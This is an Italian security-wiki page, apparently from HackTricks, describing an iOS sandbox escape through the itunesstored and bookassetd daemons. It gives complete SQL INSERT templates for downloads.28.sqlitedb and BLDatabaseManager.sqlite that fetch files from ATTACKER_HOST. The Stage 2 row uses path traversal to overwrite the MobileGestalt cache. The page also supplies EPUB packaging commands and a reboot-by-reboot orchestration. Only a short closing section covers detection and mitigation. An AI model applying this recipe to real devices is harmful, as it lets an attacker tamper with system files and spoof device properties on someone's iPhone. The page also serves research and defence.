# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Ricerche recenti mostrano che due daemon iOS preinstallati, **`itunesstored`** (downloads manager) e **`bookassetd`** (Books / iBooks asset manager), si fidano ciecamente dei metadati SQLite scrivibili dall'utente. Posizionando file appositamente realizzati `downloads.28.sqlitedb` e `BLDatabaseManager.sqlite` oltre a un archivio EPUB minimo, un attacker in grado di scrivere sotto `/var/mobile/Media/` può costringere questi daemon a effettuare **scritture arbitrarie di file nella maggior parte dei percorsi di proprietà `mobile` all'interno di `/private/var/`**. Le primitive sopravvivono ai reboot e permettono di manomettere cache di system group come `systemgroup.com.apple.mobilegestaltcache` per spoofare proprietà del dispositivo o persistere configurazioni.

Proprietà principali:

- Funziona su dispositivi almeno fino a **iOS 26.2b1** (testato su iPhone 12 / iOS 26.0.1).
- I target scrivibili includono cache `SystemGroup`, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media` e altri file di proprietà `mobile`. Le scritture su file di proprietà `root` falliscono.
- Richiede solo accesso a livello AFC (USB file copy) o qualsiasi foothold che consenta di sostituire i DB SQLite target e caricare payload.

## Modello di minaccia e requisiti

1. **Accesso locale al filesystem** a `/var/mobile/Media/Downloads/` e `/var/mobile/Media/Books/` (via client AFC come 3uTools, i4.cn, o [`afcclient`](https://github.com/emonti/afcclient) over USB, o qualsiasi compromesso precedente).
2. **Server HTTP** che ospiti i file dell'attacker (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, crafted EPUB) esposti tramite URL come `https://ATTACKER_HOST/fileprovider.php?type=...`.
3. Capacità di **riavviare il dispositivo più volte** per fare in modo che ogni daemon ricarichi il proprio database.
4. Conoscenza dell'**UUID del Books system-group** in modo che la scrittura Stage 1 finisca nel container giusto (trovabile via syslog).

## Stage 1 – Abusing `downloads.28.sqlitedb` via `itunesstored`

`itunesstored` processa `/var/mobile/Media/Downloads/downloads.28.sqlitedb`. La tabella `asset` memorizza URL + metadata di destinazione ed è trattata come input trusted. Creando una riga che punti a un URL dell'attacker e imposti `local_path` su `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` dentro il Books SystemGroup si induce `itunesstored` a scaricare e sovrascrivere il database di Books con contenuto attacker al boot.

### Individuare l'UUID del Books SystemGroup

1. Raccogli un archivio syslog con [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3):
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. Apri `logs.logarchive` in **Console.app** e cerca `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`.
3. Annota `<UUID>` e sostituiscilo nel payload SQL.

### Riga `asset` malevola

<details>
<summary>Template INSERT Stage 1</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**Campi importanti:**

- `url`: endpoint controllato dall'attaccante che restituisce il `BLDatabaseManager.sqlite` maligno.
- `local_path`: il file `BLDatabaseManager.sqlite` del gruppo di sistema Books determinato sopra.
- Flag di controllo: mantenere i default (`asset_type='media'`, `path_extension='epub'`, booleani impostati su 0/1 come nel template) in modo che il daemon accetti il task.

### Distribuzione

1. Eliminare le voci obsolete in `/var/mobile/Media/Downloads/*` per evitare race.
2. Sostituire `downloads.28.sqlitedb` con il DB creato tramite AFC.
3. Riavviare → `itunesstored` scarica il database Stage 2 e deposita `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
4. Copiare quel plist in `/var/mobile/Media/Books/iTunesMetadata.plist`; Stage 2 se lo aspetta in quella posizione.

## Stage 2 – Abusando di `BLDatabaseManager.sqlite` tramite `bookassetd`

`bookassetd` possiede entitlements più ampi sul filesystem e si fida della tabella `ZBLDOWNLOADINFO`. Inserendo una riga di acquisto finta che punta a URL controllati dall'attaccante e una traversal in `ZPLISTPATH`, il daemon scarica il tuo EPUB in `/var/mobile/Media/Books/asset.epub` e poi estrae i metadati in **qualsiasi percorso di proprietà di `mobile` raggiungibile tramite sequenze di escape `../../..`**.

### Riga `ZBLDOWNLOADINFO` malevola

<details>
<summary>Template INSERT di Stage 2</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

Important fields:

- `ZASSETPATH`: on-disk EPUB location controlled by the attacker.
- `ZURL`/`ZPERMLINK`: URL dell'attaccante che ospitano l'EPUB e il plist ausiliario.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – la **path traversal base** applicata ai file estratti dall'EPUB. Regola la profondità di traversal per raggiungere il SystemGroup target desiderato.
- Purchase metadata (`ZSTOREIDENTIFIER`, names, timestamps) imitano voci legittime così che il daemon non scarti la riga.

Dopo aver copiato il DB malevolo in `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` (grazie a Stage 1) e aver riavviato due volte, `bookassetd` farà (1) il download dell'EPUB, (2) lo elaborerà e scriverà il plist derivato nel percorso attraversato.

## Creazione del payload EPUB

`bookassetd` rispetta il formato EPUB ZIP: `mimetype` deve essere la prima voce non compressa. Per mappare il contenuto dell'EPUB nella cache MobileGestalt, crea un albero di directory che rispecchi il percorso desiderato relativo a `ZPLISTPATH`.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
Crea l'archivio:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` tipicamente contiene la stringa letterale `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` contiene il payload controllato dall'attaccante che finirà in `.../Library/Caches/com.apple.MobileGestalt.plist`.

## Flusso di orchestrazione

1. **Preparare i file** sul server HTTP dell'attaccante e creare entrambi i DB SQLite con valori specifici per host/UUID.
2. **Sostituire `downloads.28.sqlitedb`** sul dispositivo e riavviare → Fase 1 scarica il malizioso `BLDatabaseManager.sqlite` e genera `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
3. **Copiare `iTunesMetadata.plist`** in `/var/mobile/Media/Books/iTunesMetadata.plist` (ripetere se il daemon lo elimina).
4. **Riavviare di nuovo** → `bookassetd` scarica `asset.epub` in `/var/mobile/Media/Books/` usando i metadata della Fase 2.
5. **Riavviare per la terza volta** → `bookassetd` elabora l'asset scaricato, segue `ZPLISTPATH` e scrive i contenuti EPUB nel percorso SystemGroup target (es., `com.apple.MobileGestalt.plist`).
6. **Verificare** leggendo il plist sovrascritto o osservando che le proprietà derivate da MobileGestalt (identificatore modello, flag di attivazione, ecc.) cambiano di conseguenza.

Lo stesso schema permette di depositare file in altre cache di proprietà `mobile`, come lo stato FairPlay o directory di persistenza, consentendo manomissioni furtive senza necessità di un exploit del kernel.

## Strumenti e note operative

- **`pymobiledevice3 syslog collect logs.logarchive`** – estrarre gli archivi di log per scoprire l'UUID del Books SystemGroup.
- **Console.app** – filtrare per `bookassetd [Database]: Store is at ...` per recuperare il percorso esatto del container.
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – inviare/estrarre DB SQLite e file plist via USB senza jailbreak.
- **`zip`** – applicare i vincoli di ordinamento EPUB quando si impacchettano i payload.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> fornisce template SQLite/EPUB di base che puoi personalizzare.

## Idee per rilevamento e mitigazione

- Trattare `downloads.28.sqlitedb` e `BLDatabaseManager.sqlite` come input non attendibile: verificare che `local_path` / `ZPLISTPATH` rimangano entro sandbox approvate e rifiutare percorsi completamente qualificati o token di traversal.
- Monitorare scritture AFC che sostituiscono questi database o per download inaspettati avviati da `itunesstored` / `bookassetd` poco dopo l'avvio.
- Rafforzare l'unpacking di `bookassetd` utilizzando `realpath()` sul target di output e assicurarsi che non possa uscire dal container Books prima di scrivere i file.
- Limitare i canali di copia file AFC / USB o richiedere interazione dell'utente prima di consentire la sostituzione dei file di metadata Books/iTunes.

## References

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
